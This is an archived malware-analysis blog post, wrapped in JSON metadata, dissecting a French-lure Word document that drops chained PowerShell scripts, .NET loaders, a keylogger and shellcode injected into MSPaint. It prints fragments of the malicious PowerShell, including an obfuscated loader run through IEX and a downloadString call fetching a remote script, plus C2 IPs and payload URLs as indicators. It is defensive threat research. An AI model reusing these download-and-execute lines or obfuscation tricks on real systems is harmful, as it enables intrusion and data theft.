{
    "id": "8c052256-01d5-4a06-a075-cb49c5c8d8fa",
    "created_at": "2023-01-12T15:09:34.803901Z",
    "updated_at": "2025-03-27T02:05:45.618363Z",
    "deleted_at": null,
    "sha1_hash": "0fb8468e4277a1c3bdb21480b2ec8c31964f0e02",
    "title": "2021-05-26 - PSChain",
    "authors": "",
    "file_creation_date": "2022-05-28T15:53:39Z",
    "file_modification_date": "2022-05-28T15:53:39Z",
    "file_size": 1313258,
    "plain_text": "# PSChain\n\n**inquest.net/blog/2021/05/26/pschain**\n\nWe have found an exciting document that hides a whole chain of PS scripts. Unfortunately, the original\ndocument has used a coercive lure to make the victim enable macros that drop malicious artifacts. This specific\ndocument's lure is written in French \"BIENVENUE DANS WORD Microsoft Word a ete mise a jour avec succes\"\n\n**File Type: Microsoft Windows Document**\n\n**MD5 at InQuest Labs:** **[ca09b19b6975e090fb4eda6ced1847b1](https://labs.inquest.net/dfi/hash/f970630a41a2e8fe61fa3f2cf69dff87ac3fb272d006d6af866ca17264b14ff3)**\n\n\n-----\n\nImage 1: ca09b19b6975e090fb4eda6ced1847b1 document lure\n\n[At the time of submission, the document had a relatively low detection rate on Virustotal. Over time the](https://www.virustotal.com/gui/file/f970630a41a2e8fe61fa3f2cf69dff87ac3fb272d006d6af866ca17264b14ff3/detection)\ndetection will increase, but the initial download and analysis is important.\n\nImage 2: VirusTotal Detection 5/59\n\nIf the file is heavily obfuscated, it helps to run it in a virtual environment. To undersstand the basic functionality\nof a malicous or legitamite file, dynamic analysis through a sandbox indicates this document is loading a\nPowershell file.\n\nImage 3: Downloading PS file\n```\nhxxps://www.4sync[.]com/web/directDownload/QHZsERS6/rHb0lMWD.f2e6a9154ab6cd29b337d6b555367580\n\n```\nLooking at the contents of the downloaded script.\n\n\n-----\n\n```\n$\n$aMsEjutuOSYR=@(102,117,110,99,116,105,111,110,32,109,101,114,116,115,97,10,123,10,32,32,105,96,69,96,12\n[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::F\n[System.Text.Encoding]::ASCII.GetString($aMsEjutuOSYR)|&('I'+'EX');\n\n```\nThe content at the beginning of the script is decoded with this function.\n```\nfunctionmertsa§ i`E`є x(nwobjectnet.webclient).downloadString('ht'+'tp://se'+'cure.gravi'+'om.fr'+':80/fa'+'ndi.p'+'s1')mertsa\n\n```\nThe above code loads the following script, which starts to get more interesting.\n\nImage 4: Url of next stage code\n\n```\nhxxps://raw.githubusercontent[.]com/R3mEm/vox/main/vox.ps1\n\n```\n\nImage 5: Vox.ps1\n\nThe script contains a large volume of data after converting it to hex.\n\nImage 6: Vox to Hex\n\nIt is apparent that the data is encoded with BASE64, and the reverse function is implemented. In order to\ncontinue the analysis, we must use the reverse function and decode the base64.\n\nImage 7: Unpacked executable file\n\nCarving out the executable confirms that we are on the right track.\n\n**File Type: PE32+ executable for MS Windows (GUI) Mono/.Net assembly**\n\n**MD5: BAC7BE7EEBB8670AE624A0179A366148**\n\nThe executable is written in .NET. It is easy to analyze, considering it is not obfuscated by any means.\n\n\n-----\n\nImage 8: .NET executable\n\nThe program collects system information to include antivirus products, display information, and the system's\ncapacity.\n\nImage 9: Harvest system information\n\nThe program then connects to a remote server based on two addresses and several randomized ports.\n\nImage 10: Connection functionality\n\nThe following function connects to a remote server. If the connection fails, the program goes to sleep and tries\nagain later.\n\n\n-----\n\nImage 11: C2 Infrastructure\n\nImage 12: Encryption Key\n\nIf the treat actor decides the victim matches their parameters, they download other data, which is also decrypted\nwith the above key. Based on the fact that the data would be launched after decryption, the subsequent\ndownload would likely be another executable file.\n\nImage 13: Self Destruction\n\nThreat actors often take special measures to prevent their payloads from being analyzed, but we got lucky and\nmanaged to get the executable file.\n\n**File Type: PE64+ executable for MS Windows (GUI) Mono/.Net assembly**\n\n**MD5: 0B1D7C043BE8C696D53D63FC0C834195**\n\nThis executable file is also written in .NET. It collects information about keystrokes and mouse movements.\nAdditional functionality is included to capture screenshots. Special attention is directed to the fact that the\nprogram injects shellcode into MSPaint.\n\n\n-----\n\nImage 14: Shellcode written to MSPaint\n\nBefore the injection and execution of the shellcode, the program applies the byte reverse function.\n\nImage 15: Reverse byte function\n\nAfter unpacking, the shellcode looks like this.\n\nImage 16: Unpacked shellcode\n\nThis shellcode is rather interesting. Its purpose is to communicate with a remote server in the \"mspaint\" address\nspace.\n\n\n-----\n\nImage 17: C2 Assembly\n\nImage 18: C2 address\n\nTargeted attacks still pose a threat to the information security of many organizations. Deep dive analysis of the\nthreats can help to prepare for future attacks.\n\n**Debug Strings:**\nC:\\Users\\wallstreet\\source\\repos\\WindowsFormsApp3\\WindowsFormsApp3\\bin\\x64\\Release\\liko.pdb\n\nC:\\Users\\wallstreet\\source\\repos\\Billang\\Billang\\obj\\Release\\Billang.pdb\n\n**IOCs:**\n\nBAC7BE7EEBB8670AE624A0179A366148\n\nF2F34C3AF3D8F3AE5E2A28DBFB87681E\n\n0B1D7C043BE8C696D53D63FC0C834195\n\nca09b19b6975e090fb4eda6ced1847b\n\nhxxp://secure[.]graviom[.]fr[:]80/fandi.ps1\n\nhxxp://secure.graviom[.]fr/update.bin\n\nhxxps://raw.githubusercontent[.]com/R3mEm/vox/main/vox.ps1\n\nhxxps://www.4sync[.]com/web/directDownload/QHZsERS6/rHb0lMWD.f2e6a9154ab6cd9b337d6b555367580\n\n35.181.50.113\n\n3.8.126.182\n\n15.236.51.204\n\nTags\n\n[guest](https://inquest.net/taxonomy/term/70) [in-the-wild threat-hunting reverse-engineering](https://inquest.net/taxonomy/term/8)\n\n## Get The InQuest Insider\n\n[Find us on Twitter for frequent updates, follow our Blog for bi-weekly technical write-ups, or subscribe here to](https://twitter.com/inquest)\nreceive our monthly newsletter, The InQuest Insider. We curate and provide you with the latest news stories,\nfield notes about innovative malware, novel research / analysis / threat hunting tools, security tips and more.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-05-26 - PSChain.pdf"
    ],
    "report_names": [
        "2021-05-26 - PSChain.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536174,
    "ts_updated_at": 1743041145,
    "ts_creation_date": 1653753219,
    "ts_modification_date": 1653753219,
    "files": {
        "pdf": "https://archive.orkl.eu/0fb8468e4277a1c3bdb21480b2ec8c31964f0e02.pdf",
        "text": "https://archive.orkl.eu/0fb8468e4277a1c3bdb21480b2ec8c31964f0e02.txt",
        "img": "https://archive.orkl.eu/0fb8468e4277a1c3bdb21480b2ec8c31964f0e02.jpg"
    }
}